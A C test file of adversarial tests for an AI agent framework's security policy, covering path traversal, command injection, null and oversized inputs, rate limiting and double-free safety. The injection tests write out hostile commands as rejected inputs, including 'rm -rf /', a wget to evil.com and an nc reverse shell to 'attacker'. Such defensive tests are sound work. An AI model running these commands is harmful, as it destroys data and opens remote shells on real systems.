/* Adversarial / negative-path tests: null inputs, oversize payloads, boundaries, double-free safety. */
#include "human/agent/mcts_planner.h"
#include "human/agent/swarm.h"
#include "human/channels/format.h"
#include "human/channels/rate_limit.h"
#include "human/core/allocator.h"
#include "human/core/error.h"
#include "human/core/json.h"
#include "human/gateway/rate_limit.h"
#include "human/memory/corrective_rag.h"
#include "human/provider.h"
#include "human/providers/factory.h"
#include "human/security.h"
#include "human/security/moderation.h"
#include "human/tools/code_sandbox.h"
#include "test_framework.h"
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

static const char *allowed[] = {"cat", "ls", "echo"};
static const size_t allowed_len = 3;

/* ── Original path / command adversarial tests ─────────────────────────── */

static void test_path_traversal_unix(void) {
    hu_security_policy_t policy = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .workspace_dir = "/tmp/workspace",
        .allowed_paths = (const char *[]){"/tmp/workspace"},
        .allowed_paths_count = 1,
    };
    HU_ASSERT_FALSE(hu_security_path_allowed(&policy, "../../etc/passwd", 16));
    HU_ASSERT_FALSE(hu_security_path_allowed(&policy, "/etc/passwd", 11));
}

static void test_path_traversal_windows(void) {
    hu_security_policy_t policy = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_paths = (const char *[]){"C:\\workspace"},
        .allowed_paths_count = 1,
    };
    HU_ASSERT_FALSE(hu_security_path_allowed(&policy, "..\\..\\windows\\system32", 22));
}

static void test_command_injection_semicolon(void) {
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "ls; rm -rf /"));
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "cat x; wget http://evil.com"));
}

static void test_command_injection_pipe(void) {
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "cat file | nc -e /bin/sh attacker 4444"));
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "ls | tee /etc/crontab"));
}

static void test_command_injection_backticks(void) {
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "echo `whoami`"));
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "ls $(rm -rf /)"));
}

static void test_command_injection_subshell(void) {
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "echo $(id)"));
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "cat ${PATH}"));
}

static void test_command_very_long(void) {
    char buf[5000];
    memset(buf, 'a', 4095);
    buf[4095] = '\0';
    memcpy(buf + 4095, " ls", 4);
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, buf));
}

static void test_command_unicode(void) {
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    HU_ASSERT_TRUE(hu_policy_is_command_allowed(&p, "cat file.txt"));
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, "cat file | wget http://evil.com"));
}

static void test_command_null_byte(void) {
    char buf[] = "ls\x00; rm -rf /";
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    HU_ASSERT_TRUE(hu_policy_is_command_allowed(&p, buf));
}

static void test_rate_limit_exhaustion(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_rate_tracker_t *t = hu_rate_tracker_create(&alloc, 3);
    HU_ASSERT_NOT_NULL(t);
    HU_ASSERT_TRUE(hu_rate_tracker_record_action(t));
    HU_ASSERT_TRUE(hu_rate_tracker_record_action(t));
    HU_ASSERT_TRUE(hu_rate_tracker_record_action(t));
    HU_ASSERT_FALSE(hu_rate_tracker_record_action(t));
    HU_ASSERT_TRUE(hu_rate_tracker_is_limited(t));
    hu_rate_tracker_destroy(t);
}

static void test_policy_null_inputs(void) {
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(NULL, "ls"));
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(NULL, NULL));
}

static void test_policy_empty_command(void) {
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    HU_ASSERT_FALSE(hu_policy_is_command_allowed(&p, ""));
}

static void test_policy_validate_null_command(void) {
    hu_security_policy_t p = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    hu_command_risk_level_t risk;
    hu_error_t err = hu_policy_validate_command(&p, NULL, false, &risk);
    HU_ASSERT_EQ(err, HU_ERR_INVALID_ARGUMENT);
}

static void test_path_allowed_null_policy(void) {
    HU_ASSERT_FALSE(hu_security_path_allowed(NULL, "/tmp/file", 9));
}

static void test_path_allowed_no_allowlist(void) {
    hu_security_policy_t policy = {
        .autonomy = HU_AUTONOMY_SUPERVISED,
        .allowed_paths = NULL,
        .allowed_paths_count = 0,
    };
    HU_ASSERT_FALSE(hu_security_path_allowed(&policy, "/any/path", 9));
}

/* ── NULL safety (API surface) ─────────────────────────────────────────── */

static void adversarial_provider_create_null_alloc(void) {
    hu_provider_t p;
    hu_error_t e = hu_provider_create(NULL, "openai", 6, NULL, 0, NULL, 0, &p);
    HU_ASSERT_EQ(e, HU_ERR_INVALID_ARGUMENT);
}

static void adversarial_provider_create_null_name(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_provider_t p;
    hu_error_t e = hu_provider_create(&alloc, NULL, 0, NULL, 0, NULL, 0, &p);
    HU_ASSERT_EQ(e, HU_ERR_INVALID_ARGUMENT);
}

static void adversarial_provider_create_null_out(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_error_t e = hu_provider_create(&alloc, "openai", 6, NULL, 0, NULL, 0, NULL);
    HU_ASSERT_EQ(e, HU_ERR_INVALID_ARGUMENT);
}

static void adversarial_channel_format_outbound_null_args(void) {
    hu_allocator_t alloc = hu_system_allocator();
    char *out = NULL;
    size_t out_len = 0;
    HU_ASSERT_EQ(hu_channel_format_outbound(NULL, "cli", 3, "hi", 2, &out, &out_len),
                 HU_ERR_INVALID_ARGUMENT);
    HU_ASSERT_EQ(hu_channel_format_outbound(&alloc, "cli", 3, "hi", 2, NULL, &out_len),
                 HU_ERR_INVALID_ARGUMENT);
    HU_ASSERT_EQ(hu_channel_format_outbound(&alloc, "cli", 3, "hi", 2, &out, NULL),
                 HU_ERR_INVALID_ARGUMENT);
}

static void adversarial_code_sandbox_execute_null_args(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_code_sandbox_config_t cfg = hu_code_sandbox_config_default();
    hu_code_sandbox_result_t res;
    HU_ASSERT_EQ(hu_code_sandbox_execute(NULL, &cfg, NULL, "x", 1, &res),
                 HU_ERR_INVALID_ARGUMENT);
    HU_ASSERT_EQ(hu_code_sandbox_execute(&alloc, NULL, NULL, "x", 1, &res),
                 HU_ERR_INVALID_ARGUMENT);
    HU_ASSERT_EQ(hu_code_sandbox_execute(&alloc, &cfg, NULL, "x", 1, NULL),
                 HU_ERR_INVALID_ARGUMENT);
    HU_ASSERT_EQ(hu_code_sandbox_execute(&alloc, &cfg, NULL, NULL, 0, &res),
                 HU_ERR_INVALID_ARGUMENT);
}

static void adversarial_mcts_plan_null_args(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_mcts_result_t mr;
    hu_mcts_config_t mc = hu_mcts_config_default();
    HU_ASSERT_EQ(hu_mcts_plan(NULL, "g", 1, NULL, 0, &mc, &mr), HU_ERR_INVALID_ARGUMENT);
    HU_ASSERT_EQ(hu_mcts_plan(&alloc, NULL, 1, NULL, 0, &mc, &mr), HU_ERR_INVALID_ARGUMENT);
    HU_ASSERT_EQ(hu_mcts_plan(&alloc, "g", 1, NULL, 0, &mc, NULL), HU_ERR_INVALID_ARGUMENT);
}

static void adversarial_swarm_execute_null_args(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_swarm_result_t sr;
    hu_swarm_task_t t = {0};
    HU_ASSERT_EQ(hu_swarm_execute(NULL, NULL, &t, 1, &sr), HU_ERR_INVALID_ARGUMENT);
    HU_ASSERT_EQ(hu_swarm_execute(&alloc, NULL, &t, 1, NULL), HU_ERR_INVALID_ARGUMENT);
}

static void adversarial_swarm_aggregate_null_args(void) {
    hu_swarm_result_t sr = {0};
    char buf[8];
    size_t n = 0;
    HU_ASSERT_EQ(hu_swarm_aggregate(NULL, HU_SWARM_AGG_CONCATENATE, buf, sizeof(buf), &n),
                 HU_ERR_INVALID_ARGUMENT);
    HU_ASSERT_EQ(hu_swarm_aggregate(&sr, HU_SWARM_AGG_CONCATENATE, NULL, sizeof(buf), &n),
                 HU_ERR_INVALID_ARGUMENT);
    HU_ASSERT_EQ(hu_swarm_aggregate(&sr, HU_SWARM_AGG_CONCATENATE, buf, sizeof(buf), NULL),
                 HU_ERR_INVALID_ARGUMENT);
}

static void adversarial_rate_limiter_create_null_alloc(void) {
    HU_ASSERT_NULL(hu_rate_limiter_create(NULL, 10, 60));
}

static void adversarial_channel_rate_limiter_null_limiter(void) {
    /* Implementation treats NULL limiter as permissive (consume succeeds). */
    HU_ASSERT_TRUE(hu_channel_rate_limiter_try_consume(NULL, 1));
}

static void adversarial_moderation_check_local_null_combinations(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_moderation_result_t mr;
    const char *txt = "hello";
    HU_ASSERT_EQ(hu_moderation_check_local(NULL, txt, 5, &mr), HU_ERR_INVALID_ARGUMENT);
    HU_ASSERT_EQ(hu_moderation_check_local(&alloc, NULL, 5, &mr), HU_ERR_INVALID_ARGUMENT);
    HU_ASSERT_EQ(hu_moderation_check_local(&alloc, txt, 5, NULL), HU_ERR_INVALID_ARGUMENT);
}

static void adversarial_crag_grade_document_null_combinations(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_rag_graded_doc_t gd;
    const char *q = "query";
    const char *d = "document body";
    HU_ASSERT_EQ(hu_crag_grade_document(NULL, q, 5, d, 13, &gd), HU_ERR_INVALID_ARGUMENT);
    HU_ASSERT_EQ(hu_crag_grade_document(&alloc, NULL, 5, d, 13, &gd), HU_ERR_INVALID_ARGUMENT);
    HU_ASSERT_EQ(hu_crag_grade_document(&alloc, q, 5, NULL, 13, &gd), HU_ERR_INVALID_ARGUMENT);
    HU_ASSERT_EQ(hu_crag_grade_document(&alloc, q, 5, d, 13, NULL), HU_ERR_INVALID_ARGUMENT);
}

/* ── Oversized / stress inputs ───────────────────────────────────────────── */

static void adversarial_code_sandbox_code_len_size_max(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_code_sandbox_config_t cfg = hu_code_sandbox_config_default();
    hu_code_sandbox_result_t res;
    static const char z = '\0';
    hu_error_t e = hu_code_sandbox_execute(&alloc, &cfg, NULL, &z, SIZE_MAX, &res);
#if defined(HU_IS_TEST) && HU_IS_TEST
    HU_ASSERT_EQ(e, HU_OK);
#else
    (void)e;
    /* Non-test builds cap copy length; must not crash. */
#endif
}

static void adversarial_mcts_plan_large_goal(void) {
    hu_allocator_t alloc = hu_system_allocator();
    const size_t glen = 100000;
    char *goal = (char *)malloc(glen);
    HU_ASSERT_NOT_NULL(goal);
    memset(goal, 'g', glen);
    hu_mcts_config_t mc = hu_mcts_config_default();
    mc.max_iterations = 2;
    hu_mcts_result_t mr;
    hu_error_t e = hu_mcts_plan(&alloc, goal, glen, NULL, 0, &mc, &mr);
    HU_ASSERT_EQ(e, HU_OK);
    hu_mcts_result_free_path(&alloc, &mr);
    free(goal);
}

static void adversarial_config_json_deeply_nested(void) {
    /* Parser max depth is 64; 100 levels must fail cleanly with HU_ERR_JSON_DEPTH. */
    const int levels = 100;
    size_t need = (size_t)levels * 5u + 4u + (size_t)levels + 2u;
    char *buf = (char *)malloc(need);
    HU_ASSERT_NOT_NULL(buf);
    size_t pos = 0;
    for (int i = 0; i < levels; i++) {
        memcpy(buf + pos, "{\"n\":", 5);
        pos += 5;
    }
    memcpy(buf + pos, "null", 4);
    pos += 4;
    for (int i = 0; i < levels; i++)
        buf[pos++] = '}';
    buf[pos] = '\0';

    hu_allocator_t alloc = hu_system_allocator();
    hu_json_value_t *v = NULL;
    hu_error_t e = hu_json_parse(&alloc, buf, pos, &v);
    HU_ASSERT_EQ(e, HU_ERR_JSON_DEPTH);
    HU_ASSERT_NULL(v);
    free(buf);
}

static void adversarial_channel_format_oversized_message(void) {
    const size_t big = (size_t)1024 * 1024u + 1u;
    char *msg = (char *)malloc(big);
    HU_ASSERT_NOT_NULL(msg);
    memset(msg, 'm', big);
    hu_allocator_t alloc = hu_system_allocator();
    char *out = NULL;
    size_t out_len = 0;
    hu_error_t e = hu_channel_format_outbound(&alloc, "cli", 3, msg, big, &out, &out_len);
    HU_ASSERT_EQ(e, HU_OK);
    HU_ASSERT_NOT_NULL(out);
    alloc.free(alloc.ctx, out, out_len + 1);
    free(msg);
}

/* ── Empty inputs ───────────────────────────────────────────────────────── */

static void adversarial_code_sandbox_empty_code(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_code_sandbox_config_t cfg = hu_code_sandbox_config_default();
    hu_code_sandbox_result_t res;
    static const char empty[] = "";
    hu_error_t e = hu_code_sandbox_execute(&alloc, &cfg, NULL, empty, 0, &res);
    HU_ASSERT_EQ(e, HU_OK);
}

static void adversarial_swarm_execute_zero_tasks(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_swarm_result_t sr;
    HU_ASSERT_EQ(hu_swarm_execute(&alloc, NULL, NULL, 0, &sr), HU_OK);
    HU_ASSERT_EQ(sr.task_count, 0);
}

static void adversarial_mcts_plan_empty_goal(void) {
    hu_allocator_t alloc = hu_system_allocator();
    static const char empty[] = "";
    hu_mcts_config_t mc = hu_mcts_config_default();
    mc.max_iterations = 1;
    hu_mcts_result_t mr;
    HU_ASSERT_EQ(hu_mcts_plan(&alloc, empty, 0, NULL, 0, &mc, &mr), HU_OK);
    hu_mcts_result_free_path(&alloc, &mr);
}

static void adversarial_moderation_check_local_empty_text(void) {
    hu_allocator_t alloc = hu_system_allocator();
    static const char empty[] = "";
    hu_moderation_result_t mr;
    HU_ASSERT_EQ(hu_moderation_check_local(&alloc, empty, 0, &mr), HU_OK);
    HU_ASSERT_FALSE(mr.flagged);
}

/* ── Boundary values ───────────────────────────────────────────────────── */

static void adversarial_gateway_rate_limiter_exhaust_and_block(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_rate_limiter_t *lim = hu_rate_limiter_create(&alloc, 3, 3600);
    HU_ASSERT_NOT_NULL(lim);
    HU_ASSERT_TRUE(hu_rate_limiter_allow(lim, "192.0.2.1"));
    HU_ASSERT_TRUE(hu_rate_limiter_allow(lim, "192.0.2.1"));
    HU_ASSERT_TRUE(hu_rate_limiter_allow(lim, "192.0.2.1"));
    HU_ASSERT_FALSE(hu_rate_limiter_allow(lim, "192.0.2.1"));
    hu_rate_limiter_destroy(lim);
}

static void adversarial_channel_rate_limiter_consume_exact_capacity(void) {
    hu_channel_rate_limiter_t lim;
    hu_channel_rate_limiter_init(&lim, 4, 0);
    HU_ASSERT_TRUE(hu_channel_rate_limiter_try_consume(&lim, 4));
    HU_ASSERT_EQ(lim.tokens, 0);
    HU_ASSERT_FALSE(hu_channel_rate_limiter_try_consume(&lim, 1));
}

static void adversarial_mcts_plan_max_iterations_one(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_mcts_config_t mc = hu_mcts_config_default();
    mc.max_iterations = 1;
    hu_mcts_result_t mr;
    HU_ASSERT_EQ(hu_mcts_plan(&alloc, "task", 4, NULL, 0, &mc, &mr), HU_OK);
    hu_mcts_result_free_path(&alloc, &mr);
}

static void adversarial_mcts_plan_max_depth_zero_uses_default(void) {
    /* max_depth == 0 selects built-in default (not literal zero depth). */
    hu_allocator_t alloc = hu_system_allocator();
    hu_mcts_config_t mc = hu_mcts_config_default();
    mc.max_depth = 0;
    mc.max_iterations = 2;
    hu_mcts_result_t mr;
    HU_ASSERT_EQ(hu_mcts_plan(&alloc, "task", 4, NULL, 0, &mc, &mr), HU_OK);
    HU_ASSERT_GT(mr.max_depth_reached, 0);
    hu_mcts_result_free_path(&alloc, &mr);
}

static void adversarial_swarm_execute_max_parallel_zero(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_swarm_config_t cfg = hu_swarm_config_default();
    cfg.max_parallel = 0;
    hu_swarm_task_t tasks[1] = {0};
    memcpy(tasks[0].description, "a", 1);
    tasks[0].description_len = 1;
    hu_swarm_result_t sr;
    HU_ASSERT_EQ(hu_swarm_execute(&alloc, &cfg, tasks, 1, &sr), HU_OK);
    hu_swarm_result_free(&alloc, &sr);
}

/* ── Double-free / cleanup idempotence ─────────────────────────────────── */

static void adversarial_swarm_result_free_twice(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_swarm_task_t tasks[1] = {0};
    memcpy(tasks[0].description, "ok", 2);
    tasks[0].description_len = 2;
    hu_swarm_result_t sr;
    HU_ASSERT_EQ(hu_swarm_execute(&alloc, NULL, tasks, 1, &sr), HU_OK);
    hu_swarm_result_free(&alloc, &sr);
    hu_swarm_result_free(&alloc, &sr);
}

static void adversarial_mcts_result_free_path_twice(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_mcts_config_t mc = hu_mcts_config_default();
    mc.max_iterations = 3;
    hu_mcts_result_t mr;
    HU_ASSERT_EQ(hu_mcts_plan(&alloc, "plan", 4, NULL, 0, &mc, &mr), HU_OK);
    hu_mcts_result_free_path(&alloc, &mr);
    hu_mcts_result_free_path(&alloc, &mr);
}

static void adversarial_crag_result_free_zeroed_struct(void) {
    hu_allocator_t alloc = hu_system_allocator();
    hu_crag_result_t cr;
    memset(&cr, 0, sizeof(cr));
    hu_crag_result_free(&alloc, &cr);
}

void run_adversarial_tests(void) {
    HU_TEST_SUITE("Adversarial - Path traversal");
    HU_RUN_TEST(test_path_traversal_unix);
    HU_RUN_TEST(test_path_traversal_windows);
    HU_RUN_TEST(test_path_allowed_null_policy);
    HU_RUN_TEST(test_path_allowed_no_allowlist);

    HU_TEST_SUITE("Adversarial - Command injection");
    HU_RUN_TEST(test_command_injection_semicolon);
    HU_RUN_TEST(test_command_injection_pipe);
    HU_RUN_TEST(test_command_injection_backticks);
    HU_RUN_TEST(test_command_injection_subshell);

    HU_TEST_SUITE("Adversarial - Edge cases");
    HU_RUN_TEST(test_command_very_long);
    HU_RUN_TEST(test_command_unicode);
    HU_RUN_TEST(test_command_null_byte);
    HU_RUN_TEST(test_rate_limit_exhaustion);
    HU_RUN_TEST(test_policy_null_inputs);
    HU_RUN_TEST(test_policy_empty_command);
    HU_RUN_TEST(test_policy_validate_null_command);

    HU_TEST_SUITE("Adversarial - NULL safety");
    HU_RUN_TEST(adversarial_provider_create_null_alloc);
    HU_RUN_TEST(adversarial_provider_create_null_name);
    HU_RUN_TEST(adversarial_provider_create_null_out);
    HU_RUN_TEST(adversarial_channel_format_outbound_null_args);
    HU_RUN_TEST(adversarial_code_sandbox_execute_null_args);
    HU_RUN_TEST(adversarial_mcts_plan_null_args);
    HU_RUN_TEST(adversarial_swarm_execute_null_args);
    HU_RUN_TEST(adversarial_swarm_aggregate_null_args);
    HU_RUN_TEST(adversarial_rate_limiter_create_null_alloc);
    HU_RUN_TEST(adversarial_channel_rate_limiter_null_limiter);
    HU_RUN_TEST(adversarial_moderation_check_local_null_combinations);
    HU_RUN_TEST(adversarial_crag_grade_document_null_combinations);

    HU_TEST_SUITE("Adversarial - Oversized inputs");
    HU_RUN_TEST(adversarial_code_sandbox_code_len_size_max);
    HU_RUN_TEST(adversarial_mcts_plan_large_goal);
    HU_RUN_TEST(adversarial_config_json_deeply_nested);
    HU_RUN_TEST(adversarial_channel_format_oversized_message);

    HU_TEST_SUITE("Adversarial - Empty inputs");
    HU_RUN_TEST(adversarial_code_sandbox_empty_code);
    HU_RUN_TEST(adversarial_swarm_execute_zero_tasks);
    HU_RUN_TEST(adversarial_mcts_plan_empty_goal);
    HU_RUN_TEST(adversarial_moderation_check_local_empty_text);

    HU_TEST_SUITE("Adversarial - Boundary values");
    HU_RUN_TEST(adversarial_gateway_rate_limiter_exhaust_and_block);
    HU_RUN_TEST(adversarial_channel_rate_limiter_consume_exact_capacity);
    HU_RUN_TEST(adversarial_mcts_plan_max_iterations_one);
    HU_RUN_TEST(adversarial_mcts_plan_max_depth_zero_uses_default);
    HU_RUN_TEST(adversarial_swarm_execute_max_parallel_zero);

    HU_TEST_SUITE("Adversarial - Double-free safety");
    HU_RUN_TEST(adversarial_swarm_result_free_twice);
    HU_RUN_TEST(adversarial_mcts_result_free_path_twice);
    HU_RUN_TEST(adversarial_crag_result_free_zeroed_struct);
}
